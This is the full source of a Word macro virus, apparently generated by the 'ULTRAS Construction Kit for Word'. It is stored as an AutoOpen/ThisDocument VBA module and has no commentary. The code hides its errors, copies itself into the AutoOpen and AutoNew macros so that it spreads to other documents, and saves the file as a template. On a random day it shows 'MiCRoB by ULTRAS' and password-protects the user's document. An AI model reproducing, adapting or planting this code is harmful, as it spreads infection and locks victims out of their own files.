   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   '*************************************
   '* ULTRAS CONSTRUCTION KIT FOR WORD  *
   '*            Version 2.0            *
   '*************************************
   Public Sub Main()
   Dim uCkAo$
   Dim uCkAn$
   On Error Resume Next
   uCkAo$ = WordBasic.[FileName$]() + ":AutoOpen"
   uCkAn$ = "AutoNew"
   WordBasic.MacroCopy uCkAo$, uCkAo$
   WordBasic.MacroCopy uCkAo$, uCkAn$
   WordBasic.FileSaveAs Format:=1
   WordBasic.MacroCopy uCkAo$, uCkAo$
   WordBasic.MacroCopy uCkAn$, uCkAo$
   WordBasic.FileSave
   Payload
   End Sub
   Private Sub Payload()
   Dim U
   U = WordBasic.Int(Rnd() * 30) + 1
   If WordBasic.Day(WordBasic.Now()) = U Then
   WordBasic.MsgBox "MiCRoB by ULTRAS", ("UCK"), 16
   WordBasic.FileSaveAs Password:="MiCRoB"
   End If
   End Sub
